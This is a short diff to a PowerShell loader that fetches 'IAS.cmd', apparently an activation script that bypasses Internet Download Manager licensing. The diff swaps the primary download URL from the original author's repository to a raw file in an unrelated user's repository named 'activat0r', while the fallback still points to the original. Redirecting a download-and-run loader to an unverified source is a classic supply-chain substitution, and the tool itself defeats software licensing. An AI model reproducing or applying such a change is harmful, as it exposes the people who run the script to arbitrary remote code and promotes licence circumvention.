@@ -5,7 +5,7 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://raw.githubusercontent.com/WindowsAddict/IDM-Activation-Script/main/IAS.cmd'
+$DownloadURL = 'https://raw.githubusercontent.com/Christianzgaming/activat0r/refs/heads/main/IAS.cmd'
 $DownloadURL2 = 'https://bitbucket.org/WindowsAddict/idm-activation-script/raw/main/IAS.cmd'
 
 $rand = Get-Random -Maximum 99999999
